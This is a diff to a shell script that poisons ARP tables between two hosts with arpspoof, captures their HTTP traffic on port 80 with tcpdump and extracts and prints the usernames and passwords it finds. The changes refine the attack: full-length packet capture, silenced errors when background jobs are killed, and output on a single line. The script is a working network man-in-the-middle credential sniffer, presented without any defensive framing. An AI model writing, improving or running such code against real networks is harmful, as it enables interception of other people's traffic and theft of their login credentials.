@@ -8,7 +8,7 @@ fifo=`mktemp --suffix=.fifo -u -p ./`;
 mkfifo $fifo;
 arpspoof -i $1 -t $2 $3 > /dev/null 2>&1 &
 arpspoof -i $1 -t $3 $2 > /dev/null 2>&1 &
-tcpdump -Xvv -i $1 -s 1024 -U -w $fifo "tcp port 80 and host $2" 2>/dev/null &
+tcpdump -Xvv -i $1 -s 0 -U -w $fifo "tcp port 80 and host $2" 2>/dev/null &
 
 exec 0< $fifo;
 while read line; do
@@ -22,14 +22,12 @@ while read line; do
 	fi
 done
 
-jobs -pr | xargs -I {} kill -9 {};
+jobs -pr | xargs -I {} kill -9 {} 2>/dev/null;
 rm $fifo;
 
 if [ -z $password ]; then
 	exit 1;
 else
-	echo $username1;
-	echo $password;
-	echo $fwrd;
+	echo "$username1 $password $fwrd";
 fi
 
